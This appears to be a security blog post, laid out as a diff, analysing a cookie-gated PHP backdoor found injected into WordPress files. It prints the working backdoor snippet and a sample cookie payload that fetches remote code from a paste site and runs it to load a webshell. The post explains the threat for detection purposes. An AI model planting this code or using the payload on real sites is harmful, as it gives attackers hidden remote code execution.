@@ -1,0 +1,40 @@
+Evaluating Cookies to Hide Backdoors
+
+Identifying website backdoors is not always an easy task. Since a backdoors primary function is to conceal itself while providing unauthorized access, they are often developed using a variety of techniques that can make it challenging to detect.
+For example, an attacker can inject a single line of code containing less than 130 characters into a website file. While this may not seem like a lot of code, this short string can be used to load PHP web shells on your website at the attacker’s whim —  while also preventing website visitors and administrators from detecting the malicious behavior. So, how is this done?
+$_COOKIE PHP Code Execution
+While investigating a recent incident, we came across a short snippet of injected code injection, seen below and beautified to make it easier to read.
+if (md5($_COOKIE['woofig']) == "393c853c183af6327116dd773b8f9c11")
+{
+$_COOKIE['wp_config'] .= ';';
+eval($_COOKIE['wp_config']);
+exit;
+}
+
+The attacker must add it to any file that loads with the website — for example, something like wp-load.php or an active theme/plugin file would be ideal options for WordPress websites.
+The malicious code’s operation is simple. The attacker provides a request  with two separate cookies — woofig and wp_config — which then executes in the following manner:
+
+The code checks the incoming request for a HTTP cookie with the name woofig.
+If it exists, a MD5 hash value is generated from its content and compared to an existing hash value (393c853c183af6327116dd773b8f9c11). If the hashes are different, the code doesn’t proceed. It’s similar to a password.
+Code proceeds to check the same HTTP request for a second cookie named wp_config which contains formatted PHP code and uses eval to execute it.
+
+HTTP cookies usually need to be under ~4096 bytes, so the attacker is limited in the number of characters they can use for their PHP code in the wp_config cookie. By default, HTTP access logs don’t record cookie data from visitors as it adds a lot of overhead to the log size, so we don’t know what the attacker used in this instance.
+Sample Cookie Construction
+I’ve constructed my own wp_config cookie to demonstrate how an attacker might use it. PHP code is added as the cookie’s value:
+eval(file_get_contents("https://hastebin[.]com/raw/hajopeliku"))
+
+Using file_get_contents to retrieve data from the hastebin URL, this cookie’s PHP then leverages the eval function to execute additional PHP code from the retrieved contents.
+This technique allows the attacker to selectively load the webshell through any WordPress page on the website. All the attacker has to do is add the two cookies woofig and wp_config to their request and the webshell will load, running from memory and not actually stored in a file. The only malware that has been actually added to the website is  a single line of PHP code which  performs the conditional check on cookie woofig before evaluating the code in cookie wp_config.
+For the purpose of this demonstration, I have added this short PHP sample to wp-load.php. Here it is in action:
+
+Here’s a brief walkthrough to help you understand what’s going on:
+
+I load the website without the cookies enabled, which loads a normal WordPress website page.
+I use browser tools to enable the two cookies woofig and wp_config and refresh the same page.
+The PHP webshell loads.
+I edit a file, clearly demonstrating the malicious functionality.
+When done, I disable the cookies and refresh the page.
+The website returns to expected behavior and loads the usual WordPress page.
+
+Since this short snippet of malicious code is a PHP backdoor, it’s best detected using a server side scanner that can identify the file. You can also use a WordPress plugin to scan for changes made to your WordPress core files, which normally shouldn’t be changed except during updates.
+If you believe your site has been infected with a backdoor and you need a hand to clean it up, we’re here to help.
